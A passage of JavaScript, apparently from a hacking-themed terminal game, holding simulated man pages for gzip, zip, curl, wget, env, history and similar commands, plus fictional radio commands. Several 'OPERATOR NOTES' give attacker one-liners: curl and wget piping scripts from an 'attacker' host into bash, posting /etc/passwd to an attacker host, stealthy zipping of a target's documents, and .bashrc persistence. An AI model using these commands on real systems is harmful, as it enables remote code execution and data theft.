       Pro tip: gzip is single-file compression (unlike tar which archives).
       For multiple files: tar -czvf archive.tar.gz files...

       Common patterns:
       cat file.gz | gzip -d        # Decompress to stdout
       gzip -dc file.gz | grep x    # Search in compressed file

SEE ALSO
       gunzip(1), tar(1), bzip2(1), xz(1)`,

            'gunzip': `GUNZIP(1)                       User Commands                       GUNZIP(1)

NAME
       gunzip - decompress files

SYNOPSIS
       gunzip [OPTION]... [FILE]...

DESCRIPTION
       gunzip takes a list of files on its command line and replaces each
       file with .gz extension with the original uncompressed version.

       gunzip is equivalent to gzip -d.

OPTIONS
       -c, --stdout
              Write output to stdout, keep original compressed file.

       -f, --force
              Force decompression even if file has multiple links.

       -k, --keep
              Keep (don't delete) input files.

       -l, --list
              List compression information.

       -v, --verbose
              Verbose mode.

EXAMPLES
       gunzip file.txt.gz
              Decompress file.txt.gz → file.txt

       gunzip -k file.txt.gz
              Decompress and keep compressed file.

       gunzip -c file.txt.gz > output.txt
              Decompress to different filename.

       gunzip -c file.txt.gz | head
              View start of compressed file.

OPERATOR NOTES
       Use gunzip when you need to:
       • Decompress .gz files
       • View contents of compressed logs
       • Extract downloaded compressed files

       Pro tip: Many logs are stored compressed:
       gunzip -c /var/log/syslog.2.gz | grep error

       zcat is equivalent to gunzip -c (decompress to stdout)
       zgrep searches compressed files directly

SEE ALSO
       gzip(1), zcat(1), zgrep(1)`,

            'zip': `ZIP(1)                          User Commands                         ZIP(1)

NAME
       zip - package and compress files

SYNOPSIS
       zip [options] zipfile files...

DESCRIPTION
       zip is a compression and file packaging utility. It is compatible
       with PKZIP and WinZip.

OPTIONS
       -r, --recurse-paths
              Travel the directory structure recursively.

       -e, --encrypt
              Encrypt the contents of the zipfile using a password.

       -P password
              Use password for encryption (insecure - visible in ps).

       -u, --update
              Update existing entries if newer on the file system.

       -m, --move
              Move files into zipfile (delete originals).

       -j, --junk-paths
              Store just the name, junk the path.

       -q, --quiet
              Quiet operation.

       -v, --verbose
              Verbose operation.

       -0 to -9
              Compression level: 0=store only, 9=maximum compression.

EXAMPLES
       zip archive.zip file1 file2
              Create archive with two files.

       zip -r archive.zip directory/
              Recursively zip directory.

       zip -e secure.zip sensitive.doc
              Create password-protected zip (prompts for password).

       zip -P secret archive.zip files
              Create encrypted zip with inline password (insecure).

       zip -u archive.zip newfile
              Add/update file in existing archive.

       zip -j archive.zip /path/to/file
              Store file without path.

OPERATOR NOTES
       Use zip when you need to:
       • Create Windows-compatible archives
       • Password-protect files for transfer
       • Package files for exfiltration

       Pro tip: zip encryption is WEAK (ZipCrypto).
       For real security, use: 7z with AES-256, or gpg.

       Stealth exfil: zip -q -r /tmp/.backup.zip /home/target/Documents

SEE ALSO
       unzip(1), tar(1), gzip(1), 7z(1)`,

            'unzip': `UNZIP(1)                        User Commands                       UNZIP(1)

NAME
       unzip - list, test, or extract compressed files from a ZIP archive

SYNOPSIS
       unzip [-Z] [-cflptTuvz] [-P password] file[.zip] [file(s)...] [-d dir]

DESCRIPTION
       unzip will list, test, or extract files from a ZIP archive.

OPTIONS
       -l     List archive contents.

       -v     List archive contents with verbose info.

       -t     Test archive integrity.

       -d dir
              Extract files into specified directory.

       -o     Overwrite files without prompting.

       -n     Never overwrite existing files.

       -P password
              Use password to decrypt encrypted archive.

       -q     Quiet mode.

       file(s)
              Extract only specified files (supports wildcards).

EXAMPLES
       unzip archive.zip
              Extract all files to current directory.

       unzip archive.zip -d /tmp/
              Extract to specific directory.

       unzip -l archive.zip
              List contents without extracting.

       unzip -t archive.zip
              Test archive integrity.

       unzip archive.zip "*.txt"
              Extract only .txt files.

       unzip -P secret encrypted.zip
              Extract password-protected archive.

       unzip -o archive.zip
              Extract and overwrite without asking.

OPERATOR NOTES
       Use unzip when you need to:
       • Extract downloaded tools/exploits
       • Unpack archived data
       • List contents before extracting (always do this!)

       Pro tip: Always list before extracting:
       unzip -l suspicious.zip        # Check contents first
       unzip suspicious.zip -d /tmp/  # Extract to safe location

       Zip bombs exist! Check uncompressed size before extracting:
       unzip -l bomb.zip | tail -1    # Check total size

SEE ALSO
       zip(1), tar(1), gunzip(1)`,

            'curl': `CURL(1)                           User Commands                        CURL(1)

NAME
       curl - transfer a URL

SYNOPSIS
       curl [options] [URL...]

DESCRIPTION
       curl is a tool to transfer data from or to a server, using one of
       the supported protocols (HTTP, HTTPS, FTP, SFTP, etc.).

COMMON OPTIONS
       -o, --output <file>
              Write output to file instead of stdout

       -O, --remote-name
              Write output to file named like the remote file

       -s, --silent
              Silent mode (no progress or errors)

       -v, --verbose
              Make operation more verbose

       -L, --location
              Follow redirects

       -k, --insecure
              Allow insecure SSL connections

       -X, --request <method>
              Specify request method (GET, POST, PUT, DELETE)

       -d, --data <data>
              Send data in POST request

       -H, --header <header>
              Add header to request

       -u, --user <user:password>
              Server user and password

       -x, --proxy <host:port>
              Use proxy

EXAMPLES
       curl http://example.com
              Fetch webpage.

       curl -O http://example.com/file.zip
              Download file keeping remote name.

       curl -o output.html http://example.com
              Download to specific filename.

       curl -X POST -d "user=admin&pass=test" http://site/login
              POST form data.

       curl -H "Authorization: Bearer TOKEN" http://api/data
              Request with custom header.

       curl -u admin:password http://site/admin
              Basic authentication.

OPERATOR NOTES
       Use curl when you need to:
       • Download tools/exploits to target
       • Interact with APIs and web services
       • Test web vulnerabilities
       • Exfiltrate data via HTTP

       Pro tip: Download and execute (use carefully):
       curl http://attacker/script.sh | bash

       Exfil via POST:
       curl -X POST -d @/etc/passwd http://attacker/collect

       Check for SSRF: curl internal-service:port from target

SEE ALSO
       wget(1), fetch(1)`,

            'wget': `WGET(1)                         User Commands                        WGET(1)

NAME
       wget - non-interactive network downloader

SYNOPSIS
       wget [option]... [URL]...

DESCRIPTION
       GNU Wget is a free utility for non-interactive download of files
       from the Web. It supports HTTP, HTTPS, and FTP protocols.

COMMON OPTIONS
       -O, --output-document=FILE
              Write documents to FILE

       -q, --quiet
              Turn off output

       -v, --verbose
              Turn on verbose output

       -c, --continue
              Resume partial download

       -r, --recursive
              Turn on recursive retrieving

       --no-check-certificate
              Don't check SSL certificate

       -P, --directory-prefix=PREFIX
              Save files to directory PREFIX

       --user=USER --password=PASS
              Set HTTP username and password

EXAMPLES
       wget http://example.com/file.zip
              Download file.

       wget -O output.zip http://example.com/file.zip
              Download with specific name.

       wget -q http://example.com/script.sh
              Quiet download.

       wget -c http://example.com/large.iso
              Resume interrupted download.

       wget --no-check-certificate https://site/file
              Skip SSL verification.

OPERATOR NOTES
       Use wget when you need to:
       • Download tools to target system
       • Mirror websites for offline analysis
       • Retrieve files non-interactively (scripts)

       Pro tip: wget vs curl:
       wget - better for downloading files, has resume
       curl - better for API interaction, more protocols

       Download and execute:
       wget -qO- http://attacker/script.sh | bash

       Recursive site grab:
       wget -r -l 2 http://target/  (2 levels deep)

SEE ALSO
       curl(1)`,

            // Package management
            'apt': `APT(8)                                APT                               APT(8)

NAME
       apt - command-line interface

SYNOPSIS
       apt [-h] [-o=config_string] [-c=config_file] [-t=target_release]
           [-a=architecture] {update | upgrade | full-upgrade | install pkg...
           | remove pkg... | purge pkg... | autoremove | search regex |
           show pkg | list | edit-sources}

DESCRIPTION
       apt provides a high-level commandline interface for the package
       management system.

COMMANDS
       update
           Update list of available packages.

       upgrade
           Upgrade all installed packages to their newest versions.

       install package...
           Install packages.

       remove package...
           Remove packages.

       search regex
           Search for packages.

       show package
           Show package details.

       list --installed
           List installed packages.

EXAMPLES
       apt update
           Update package lists.

       apt upgrade
           Upgrade all packages.

       apt install nginx
           Install nginx.

       apt remove nginx
           Remove nginx.

       apt search apache
           Search for apache packages.

OPERATOR NOTES
       Use apt when you need to:
       • Audit installed software on a system (apt list --installed)
       • Check for security vulnerabilities in packages
       • Inventory software during incident response
       • Install forensic or analysis tools on a live system

       Pro tip: apt is your software inventory goldmine:
       apt list --installed | wc -l                    # Total package count
       apt list --installed | grep -i security         # Security-related pkgs
       apt show suspicious-package                     # Get package details
       apt-cache policy package                        # See version & repo source
       Check /var/log/apt/history.log for recent installs by an attacker

SEE ALSO
       apt-get(8), apt-cache(8), dpkg(1)`,

            'dpkg': `DPKG(1)                          dpkg suite                         DPKG(1)

NAME
       dpkg - package manager for Debian

SYNOPSIS
       dpkg [option...] action

DESCRIPTION
       dpkg is a tool to install, build, remove and manage Debian packages.

       -i, --install package_file...
           Install the package.

       -r, --remove package...
           Remove an installed package.

       -l, --list [package-name-pattern...]
           List packages matching pattern.

       -s, --status package-name...
           Report status of specified package.

       -L, --listfiles package-name...
           List files installed from a package.

EXAMPLES
       dpkg -i package.deb
           Install a .deb file.

       dpkg -r package-name
           Remove a package.

       dpkg -l
           List all installed packages.

       dpkg -l | grep nginx
           Find installed nginx packages.

OPERATOR NOTES
       Use dpkg when you need to:
       • List all files belonging to a specific package
       • Find which package owns a suspicious file
       • Verify package integrity (modified files)
       • Install local .deb files during analysis setup

       Pro tip: dpkg gives you low-level package forensics:
       dpkg -L nginx                                   # All files from nginx package
       dpkg -S /usr/bin/suspicious                     # What package owns this file?
       dpkg --verify package-name                      # Check for modified files
       dpkg -l | awk '/^ii/ {print $2}'                # Clean list of installed pkgs
       Modified files from --verify may indicate tampering or backdoors

SEE ALSO
       apt(8), apt-get(8)`,

            // Misc
            'echo': `ECHO(1)                         User Commands                        ECHO(1)

NAME
       echo - display a line of text

SYNOPSIS
       echo [SHORT-OPTION]... [STRING]...

DESCRIPTION
       Echo the STRING(s) to standard output.

       -n     do not output the trailing newline

       -e     enable interpretation of backslash escapes

       -E     disable interpretation of backslash escapes (default)

       If -e is in effect, the following sequences are recognized:
       \\\\    backslash
       \\n    new line
       \\t    horizontal tab

EXAMPLES
       echo "Hello World"
           Print Hello World.

       echo -n "no newline"
           Print without trailing newline.

       echo -e "Line1\\nLine2"
           Print with newlines interpreted.

       echo $HOME
           Print value of HOME variable.

OPERATOR NOTES
       Use echo when you need to:
       • Inspect environment variable values
       • Create quick files for testing (echo "data" > file)
       • Append data to logs or config files
       • Debug scripts by printing variable states

       Pro tip: echo is your quick-write and debug tool:
       echo $PATH | tr ':' '\\n'                        # Show PATH directories
       echo "malicious_ip" >> /etc/hosts.deny          # Quick block
       echo '#!/bin/bash' > script.sh                  # Start a script
       echo -e "line1\\nline2" > multiline.txt         # Create multiline file
       Check .bashrc for malicious echo commands adding to PATH

SEE ALSO
       printf(1)`,

            'env': `ENV(1)                          User Commands                         ENV(1)

NAME
       env - run a program in a modified environment

SYNOPSIS
       env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]

DESCRIPTION
       Set each NAME to VALUE in the environment and run COMMAND.
       With no COMMAND, print the resulting environment.

OPTIONS
       -i, --ignore-environment
              Start with an empty environment.

       -u, --unset=NAME
              Remove variable from the environment.

EXAMPLES
       env
              Print all environment variables.

       env | grep PATH
              Show PATH variable.

       env -i /bin/bash
              Start bash with clean environment.

       env VAR=value command
              Run command with VAR set.

       env -u HISTFILE bash
              Start bash without history file.

OPERATOR NOTES
       Use env when you need to:
       • View all environment variables (credentials, paths, configs)
       • Run commands with modified environment
       • Start clean shell without history

       Pro tip: Environment variables often contain secrets:
       env | grep -iE "(pass|key|token|secret|api)"

       Check for sensitive data in environment before exfiltration.

SEE ALSO
       export(1), printenv(1), set(1)`,

            'export': `EXPORT(1)                     Bash Builtins                      EXPORT(1)

NAME
       export - set export attribute for shell variables

SYNOPSIS
       export [-fn] [name[=value] ...]
       export -p

DESCRIPTION
       Mark each name to be passed to child processes in the environment.
       If a value is given, assign the value before exporting.

OPTIONS
       -f     Names refer to functions.

       -n     Remove the export property from each name.

       -p     Display all exported variables and functions.

EXAMPLES
       export PATH=$PATH:/opt/bin
              Add /opt/bin to PATH.

       export EDITOR=vim
              Set default editor.

       export -p
              List all exported variables.

       export VAR="value"
              Create and export in one step.

       export -n VAR
              Unexport a variable.

OPERATOR NOTES
       Use export when you need to:
       • Modify PATH to include your tools directory
       • Set environment for child processes
       • Configure shell behavior

       Pro tip: Persistence via .bashrc:
       echo 'export PATH=$PATH:/tmp/.tools' >> ~/.bashrc

       Check what's exported: export -p | grep -v "^declare"

SEE ALSO
       env(1), set(1), unset(1)`,

            'alias': `ALIAS(1)                      Bash Builtins                       ALIAS(1)

NAME
       alias - define or display aliases

SYNOPSIS
       alias [-p] [name[=value] ...]

DESCRIPTION
       Without arguments, alias prints the list of aliases.
       With arguments, an alias is defined for each name whose value is given.

OPTIONS
       -p     Print all aliases in a reusable format.

EXAMPLES
       alias
              Show all defined aliases.

       alias ll='ls -la'
              Create alias for long listing.

       alias grep='grep --color=auto'
              Add color to grep.

       alias rm='rm -i'
              Make rm interactive (safety).

       unalias ll
              Remove an alias.

COMMON USEFUL ALIASES
       alias ll='ls -la'
       alias la='ls -A'
       alias ..='cd ..'
       alias ...='cd ../..'
       alias grep='grep --color=auto'
       alias h='history'
       alias c='clear'

OPERATOR NOTES
       Use alias when you need to:
       • Create shortcuts for long commands
       • Check for malicious aliases (hijacked commands!)
       • Set up your working environment

       Pro tip: SECURITY CHECK - Malicious aliases!
       alias           # Check what's defined
       type ls         # Verify ls is really /bin/ls
       \\ls             # Bypass alias, run real command

       Attackers may alias common commands to hide activity:
       alias ls='ls --ignore=backdoor.sh'
       alias cat='cat | tee /tmp/.log'

SEE ALSO
       unalias(1), type(1), which(1)`,

            'source': `SOURCE(1)                     Bash Builtins                      SOURCE(1)

NAME
       source, . - execute commands from a file in the current shell

SYNOPSIS
       source filename [arguments]
       . filename [arguments]

DESCRIPTION
       Read and execute commands from filename in the current shell
       environment. The . (dot) command is a synonym for source.

       Unlike running a script directly (which starts a subshell),
       source runs in the current shell, so variable changes persist.

EXAMPLES
       source ~/.bashrc
              Reload bash configuration.

       . /etc/profile
              Load system profile.

       source script.sh
              Run script in current shell (variables persist).

       source <(curl -s http://example.com/script.sh)
              Source from URL (DANGEROUS!).

DIFFERENCE FROM EXECUTION
       ./script.sh    Runs in subshell, changes don't persist
       source script.sh   Runs in current shell, changes persist

       Example:
       # script.sh contains: export VAR="hello"
       ./script.sh && echo $VAR    # Empty - subshell
       source script.sh && echo $VAR  # "hello" - current shell

OPERATOR NOTES
       Use source when you need to:
       • Reload configuration without restarting shell
       • Load environment variables from files
       • Run setup scripts that modify current environment

       Pro tip: source can be dangerous - it executes arbitrary code
       in your current shell with your privileges.

       Never: source <(curl http://untrusted/script)

SEE ALSO
       bash(1), sh(1), exec(1)`,

            'clear': `CLEAR(1)                        User Commands                       CLEAR(1)

NAME
       clear - clear the terminal screen

SYNOPSIS
       clear

DESCRIPTION
       clear clears your screen if this is possible, including its
       scrollback buffer.

EXAMPLES
       clear
              Clear the terminal screen.

       Ctrl+L
              Keyboard shortcut (same effect).

       clear && ls
              Clear then list directory.

OPERATOR NOTES
       Use clear when you need to:
       • Clean up terminal for better visibility
       • Hide previous command output from shoulder surfers
       • Reset terminal display issues

       Pro tip: Ctrl+L is faster than typing clear.
       Note: clear doesn't delete history, just clears display.

SEE ALSO
       reset(1), tput(1)`,

            'date': `DATE(1)                         User Commands                        DATE(1)

NAME
       date - print or set the system date and time

SYNOPSIS
       date [OPTION]... [+FORMAT]
       date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]

DESCRIPTION
       Display the current time in the given FORMAT, or set the system date.

FORMAT CODES
       %Y     Year (4 digits)
       %m     Month (01-12)
       %d     Day of month (01-31)
       %H     Hour (00-23)
       %M     Minute (00-59)
       %S     Second (00-60)
       %F     Full date (same as %Y-%m-%d)
       %T     Time (same as %H:%M:%S)
       %s     Seconds since epoch (Unix timestamp)
       %Z     Timezone name

EXAMPLES
       date
              Show current date and time.

       date +%F
              Show date as YYYY-MM-DD.

       date +"%Y%m%d_%H%M%S"
              Timestamp for filenames.

       date +%s
              Unix timestamp (seconds since 1970).

       date -d "2 days ago"
              Show date from 2 days ago.

       date -d @1234567890
              Convert Unix timestamp to date.

       date -u
              Show UTC time.

OPERATOR NOTES
       Use date when you need to:
       • Generate timestamps for logs or filenames
       • Check system time (for log correlation)
       • Convert Unix timestamps

       Pro tip: Useful patterns:
       date +%Y%m%d_%H%M%S         # 20240115_143022
       date -d "yesterday" +%F     # Yesterday's date
       Log files often use: date +"%b %d %H:%M:%S"

SEE ALSO
       time(1), hwclock(8), timedatectl(1)`,

            'which': `WHICH(1)                        User Commands                       WHICH(1)

NAME
       which - locate a command

SYNOPSIS
       which [-a] filename ...

DESCRIPTION
       which returns the pathnames of the files (or links) which would
       be executed in the current environment.

OPTIONS
       -a     Print all matching pathnames of each argument.

EXAMPLES
       which python
              Find where python is located.

       which -a python
              Find all python executables in PATH.

       which ls cd pwd
              Check multiple commands.

OPERATOR NOTES
       Use which when you need to:
       • Find the full path to a command
       • Verify which version of a tool will run
       • Check if a command exists

       Pro tip: which only searches PATH. For complete info:
       type command    # Shows if alias, function, or file
       command -v cmd  # POSIX way to find command
       whereis cmd     # Finds binary, source, and man pages

       Security check: Verify commands are from expected locations.
       which sudo      # Should be /usr/bin/sudo, not /tmp/sudo

SEE ALSO
       type(1), whereis(1), command(1)`,

            'whereis': `WHEREIS(1)                      User Commands                      WHEREIS(1)

NAME
       whereis - locate the binary, source, and manual page for a command

SYNOPSIS
       whereis [options] name...

DESCRIPTION
       whereis locates the binary, source and manual files for the
       specified command names.

OPTIONS
       -b     Search only for binaries.

       -m     Search only for manual pages.

       -s     Search only for sources.

EXAMPLES
       whereis ls
              Find binary, source, and man page for ls.

       whereis -b python
              Find only python binary.

       whereis -m grep
              Find only grep man pages.

OUTPUT FORMAT
       ls: /bin/ls /usr/share/man/man1/ls.1.gz
       |   |       |
       cmd binary  man page

OPERATOR NOTES
       Use whereis when you need to:
       • Find all locations of a command
       • Locate man pages
       • Verify command locations

       Pro tip: whereis vs which vs type:
       which     - First match in PATH only
       whereis   - Binary, source, and man pages
       type      - Tells if alias, function, builtin, or file

SEE ALSO
       which(1), type(1), locate(1)`,

            'type': `TYPE(1)                       Bash Builtins                        TYPE(1)

NAME
       type - display information about command type

SYNOPSIS
       type [-afptP] name [name ...]

DESCRIPTION
       For each name, indicate how it would be interpreted if used as a
       command name.

OPTIONS
       -t     Print a single word: alias, keyword, function, builtin, or file.

       -p     Print the file path (only for external commands).

       -a     Print all locations containing an executable named name.

       -f     Suppress shell function lookup.

EXAMPLES
       type ls
              "ls is /bin/ls" or "ls is aliased to..."

       type -t ls
              Just print: file, alias, builtin, function, or keyword

       type cd
              "cd is a shell builtin"

       type -a python
              Show all python executables.

       type ll
              Might show "ll is aliased to 'ls -l'"

OPERATOR NOTES
       Use type when you need to:
       • Check if command is alias, builtin, or file
       • Detect aliased commands (security check!)
       • Find all versions of a command

       Pro tip: SECURITY - Detect malicious aliases:
       type ls         # Is it really /bin/ls?
       type sudo       # Is it really /usr/bin/sudo?
       type -a cat     # Any unexpected locations?

       Attackers may create aliases or scripts in PATH to intercept commands.

SEE ALSO
       which(1), whereis(1), alias(1)`,

            'chgrp': `CHGRP(1)                        User Commands                       CHGRP(1)

NAME
       chgrp - change group ownership

SYNOPSIS
       chgrp [OPTION]... GROUP FILE...
       chgrp [OPTION]... --reference=RFILE FILE...

DESCRIPTION
       Change the group of each FILE to GROUP.

OPTIONS
       -R, --recursive
              Operate on files and directories recursively.

       -v, --verbose
              Output a diagnostic for every file processed.

       -c, --changes
              Like verbose but report only when a change is made.

       --reference=RFILE
              Use RFILE's group rather than specifying a GROUP value.

EXAMPLES
       chgrp developers file.txt
              Change group to developers.

       chgrp -R www-data /var/www
              Recursively change group.

       chgrp --reference=ref.txt target.txt
              Copy group from ref.txt.

OPERATOR NOTES
       Use chgrp when you need to:
       • Fix group ownership for web files
       • Grant group access to files
       • Match group to existing files

       Pro tip: Common group patterns:
       www-data   - Web server files
       docker     - Docker socket access
       sudo       - Sudoers group

       chgrp requires membership in target group (or root).

SEE ALSO
       chmod(1), chown(1), groups(1)`,

            'watch': `WATCH(1)                        User Commands                       WATCH(1)

NAME
       watch - execute a program periodically, showing output fullscreen

SYNOPSIS
       watch [options] command

DESCRIPTION
       watch runs command repeatedly, displaying its output. This allows
       you to watch the program output change over time.

OPTIONS
       -n, --interval seconds
              Specify update interval. Default is 2 seconds.

       -d, --differences
              Highlight the differences between successive updates.

       -t, --no-title
              Turn off the header showing interval and command.

       -c, --color
              Interpret ANSI color sequences.

       -e, --errexit
              Exit if command has a non-zero exit.

EXAMPLES
       watch date
              Watch the time update every 2 seconds.

       watch -n 1 "ps aux | grep nginx"
              Monitor nginx processes every second.

       watch -d ls -l
              Watch directory, highlight changes.

       watch -n 5 df -h
              Monitor disk space every 5 seconds.

       watch "tail -20 /var/log/syslog"
              Monitor log file.

OPERATOR NOTES
       Use watch when you need to:
       • Monitor changing data in real-time
       • Watch for file changes
       • Monitor process status
       • Track network connections

       Pro tip: Useful monitoring commands:
       watch -n 1 'netstat -an | grep ESTABLISHED'
       watch -n 5 'df -h'
       watch -d 'ls -la /tmp'
       watch -n 1 'cat /proc/loadavg'

       Press Ctrl+C to exit watch.

SEE ALSO
       tail(1), top(1)`,

            'history': `HISTORY(1)                   Bash Builtins                       HISTORY(1)

NAME
       history - display command history

SYNOPSIS
       history [n]
       history -c
       history -d offset
       history [-anrw] [filename]

DESCRIPTION
       Display or manipulate the history list.

       -c     Clear the history list by deleting all entries.

       -d offset
              Delete the history entry at position offset.

       n      Display only the last n history entries.

       !n     Execute command number n from history.

       !!     Execute the previous command.

       !string
              Execute most recent command starting with string.

EXAMPLES
       history
           Show all command history.

       history 20
           Show last 20 commands.

       !100
           Execute command #100.

       !!
           Repeat last command.

OPERATOR NOTES
       Use history when you need to:
       • See what commands were executed by a user (forensics gold)
       • Track attacker activity on a compromised system
       • Re-execute previous complex commands
       • Audit your own session for documentation

       Pro tip: history is a forensic treasure trove:
       history | grep -E 'wget|curl|nc|/dev/tcp'       # Download/C2 activity
       history | grep -E 'chmod|chown|sudo'            # Privilege activity
       cat ~/.bash_history                             # Persistent history file
       HISTTIMEFORMAT="%F %T " history                 # Show timestamps
       Attackers often run 'history -c' or 'unset HISTFILE' - check for gaps!
       Also check /home/*/.bash_history for all users

SEE ALSO
       bash(1)`,

            // Radio system (The Watcher)
            'scan': `SCAN(1)                      BLACKSITE Commands                      SCAN(1)

NAME
       scan - scan radio frequencies for active signals

SYNOPSIS
       scan

DESCRIPTION
       Scans all available radio frequencies and displays signal strength
       for each channel. Use this to discover what frequencies are active
       and broadcasting.

       This is an unofficial BLACKSITE utility. Its existence is neither
       confirmed nor denied by command.

FREQUENCIES
       147.3 MHz    STATIC      - Background noise, no useful signal
       152.8 MHz    SECURITY    - Hotel security communications
       156.1 MHz    CONSORTIUM  - Encrypted hostile transmissions
       161.7 MHz    GHOST-7     - Analyst assistance network
       173.5 MHz    NUMBERS     - Unknown origin, patterns detected
       88.1 MHz     EMERGENCY   - Emergency broadcast channel

OUTPUT
       Each frequency shows:
       • Frequency in MHz
       • Signal strength indicator [██████░░░░]
       • Channel name/identifier
       • Current tuned frequency marked with ◄──

EXAMPLES
       scan
           Display all frequencies and their status.

OPERATOR NOTES
       The GHOST-7 frequency (161.7 MHz) is rumored to provide guidance
       to analysts who find themselves stuck. This has not been officially
       verified. Some operators report finding hidden .signal files in
       their working directories. We cannot comment on these reports.

SEE ALSO
       tune(1), radio(1)`,

            'tune': `TUNE(1)                      BLACKSITE Commands                      TUNE(1)

NAME
       tune - tune radio to a specific frequency

SYNOPSIS
       tune <frequency>
       tune <channel-name>

DESCRIPTION
       Tunes the radio receiver to the specified frequency or channel.
       Once tuned, you will receive broadcasts on that frequency until
       you tune to a different one.

       This is an unofficial BLACKSITE utility.

OPTIONS
       frequency
              A numeric frequency in MHz (e.g., 161.7)

       channel-name
              A channel alias: static, security, consortium, ghost,
              numbers, emergency

FREQUENCIES
       147.3    static       Background noise
       152.8    security     Security communications
       156.1    consortium   Encrypted transmissions
       161.7    ghost        Analyst assistance (GHOST-7)
       173.5    numbers      Numbers station
       88.1     emergency    Emergency broadcast

EXAMPLES
       tune 161.7
           Tune to GHOST-7 frequency.

       tune ghost
           Same as above, using channel alias.

       tune security
           Listen to security chatter.

OPERATOR NOTES
       If you're stuck on an objective, some analysts report that
       tuning to 161.7 MHz provides... guidance. The source of these
       transmissions remains unverified. We were never here.

SEE ALSO
       scan(1), radio(1)`,

            'radio': `RADIO(1)                     BLACKSITE Commands                     RADIO(1)

NAME
       radio - interact with the radio system

SYNOPSIS
       radio
       radio <frequency>

DESCRIPTION
       Without arguments, displays current frequency and scans for signals
       (equivalent to scan). With a frequency argument, tunes to that
       frequency (equivalent to tune).

EXAMPLES
       radio
           Show all frequencies (same as scan).

       radio 161.7
           Tune to 161.7 MHz (same as tune 161.7).

SEE ALSO
       scan(1), tune(1)`,

            // ═══════════════════════════════════════════════════════════════
            // EASTER EGGS
            // ═══════════════════════════════════════════════════════════════

            'sl': `SL(1)                           User Commands                          SL(1)

NAME
       sl - cure your bad strokes

SYNOPSIS
       sl [-alFe]

DESCRIPTION
       sl is a highly advanced animation program for curing your bad habit
       of mistyping 'ls'. When you accidentally type 'sl' instead of 'ls',
       you'll be treated to a steam locomotive animation as a reminder
       to type more carefully.

       sl is not a game. sl is a lesson.

OPTIONS
       -a     An accident is shown. You'll see people crying for help.

       -l     Little version (no animation).

       -F     Flying locomotive (it flies across the sky!).

       -e     Allow interrupt by Ctrl+C (normally you must watch the
              entire train pass as your punishment).

EXAMPLES
       sl
              Watch the train. Learn your lesson.

HISTORY
       Written by Toyoda Masashi as a joke/reminder program in 1993.
       Originally for UNIX systems, now a classic Easter egg installed
       on many Linux distributions.

       "If you mistype, you must watch the train. There is no escape."

OPERATOR NOTES
       If you see the sl train, you typed 'sl' instead of 'ls'.
       Take a breath. Watch the train. Be more careful next time.

       Install on real Linux: sudo apt install sl

SEE ALSO
       ls(1), cowsay(1), fortune(6)`,

            'cowsay': `COWSAY(1)                       User Commands                       COWSAY(1)

NAME
       cowsay - configurable speaking/thinking cow (and other animals)

SYNOPSIS
       cowsay [-e eye_string] [-f cowfile] [-l] [-n] [-T tongue_string]
              [-W column] [-bdgpstwy] [message]

DESCRIPTION
       Cowsay generates an ASCII picture of a cow saying something provided
       by the user. If no message is provided on the command line, it reads
       from standard input.

OPTIONS
       -f cowfile
              Use specified cow file. Examples: tux, dragon, elephant

       -l     List all available cowfiles.

       -e eye_string
              Set custom eye string (2 chars).

       -T tongue_string
              Set custom tongue string.

       -b     Borg mode (eyes = ==).

       -d     Dead cow (eyes = xx).

       -g     Greedy cow (eyes = $$).

       -p     Paranoid cow (eyes = @@).

       -s     Stoned cow (eyes = **).

       -t     Tired cow (eyes = --).

       -w     Wired cow (eyes = OO).

       -y     Youthful cow (eyes = ..).

EXAMPLES
       cowsay "Hello World"
              Basic cow greeting.

       cowsay -f tux "Linux rules"
              Tux the penguin speaks.

       fortune | cowsay
              Random fortune from a cow.

       cowsay -d "I'm not dead yet"
              Dead cow in denial.

HISTORY
       Created by Tony Monroe in 1999. cowsay is one of the most beloved
       Unix Easter eggs and has inspired countless variations including
       cowthink (thinking bubble), and hundreds of custom cowfiles.

OPERATOR NOTES
       Use cowsay when you need to:
       • Lighten the mood during long terminal sessions
       • Make documentation more entertaining
       • Annoy your coworkers with ASCII art

       Install on real Linux: sudo apt install cowsay

SEE ALSO
       fortune(6), figlet(6), sl(1)`,

            'fortune': `FORTUNE(6)                      Games Manual                       FORTUNE(6)

NAME
       fortune - print a random, hopefully interesting, adage

SYNOPSIS
       fortune [-aefilo] [-n length] [-m pattern] [file/directory]

DESCRIPTION
       When fortune is run with no arguments it prints out a random epigram.
       Epigrams are divided into several categories.

OPTIONS
       -a     Choose from all databases.

       -e     Consider all fortune files equal.

       -o     Choose only offensive fortunes (where available).

       -s     Short fortunes only (<160 characters).

       -l     Long fortunes only.

FORTUNE FILES
       fortunes       General quotes and sayings
       computers      Tech and programming humor
       literature     Literary quotes
       riddles        Riddles and puzzles
       offensive      Adult/offensive content (if installed)

EXAMPLES
       fortune
              Print a random fortune.

       fortune computers
              Print a computer-related fortune.

       fortune -s
              Print a short fortune.

       fortune | cowsay
              Fortune from a cow!

SAMPLE FORTUNES
       "There's no place like 127.0.0.1"
       "chmod 777 is not a security strategy"
       "Have you tried turning it off and on again?"
       "It works on my machine!"

OPERATOR NOTES
       Use fortune when you need to:
       • Break the tension during long debugging sessions
       • Start your terminal with a random thought
       • Add wisdom to your MOTD

       Add to .bashrc: fortune  (see a fortune on each new shell)

       Install on real Linux: sudo apt install fortune-mod

SEE ALSO
       cowsay(1), figlet(6), ddate(1)`,

            'figlet': `FIGLET(6)                       Games Manual                       FIGLET(6)

NAME
       figlet - display large characters made up of ordinary screen characters

SYNOPSIS
       figlet [-cklnoprstvxDELNRSWX] [-d fontdirectory] [-f fontfile]
              [-m layoutmode] [-w outputwidth] [-C controlfile]
              [-I infocode] [message]

DESCRIPTION
       FIGlet prints its input using large characters (called "FIG characters")
       made up of ordinary screen characters (called "sub-characters").
       FIGlet output is generally reminiscent of the banner program.

OPTIONS
       -f font
              Use specified font file.

       -w width
              Set output width.

       -c     Center output.

       -l     Left-justify output.

       -r     Right-justify output.

COMMON FONTS
       standard       Default font
       banner         Large block letters
       big            Bigger letters
       block          Solid block letters
       bubble         Bubble letters
       digital        LED-style letters
       lean           Thin letters
       mini           Small letters
       script         Script/cursive style
       shadow         Letters with shadow
       slant          Slanted letters

EXAMPLES
       figlet Hello
              Print "Hello" in large ASCII art.

       figlet -f slant "HACK"
              Print "HACK" in slanted font.

       figlet -c -w 80 "ALERT"
              Centered alert banner.

       echo "Warning" | figlet
              Pipe text to figlet.

OUTPUT EXAMPLE
       $ figlet Hi
       _   _ _
      | | | (_)
      | |_| |_
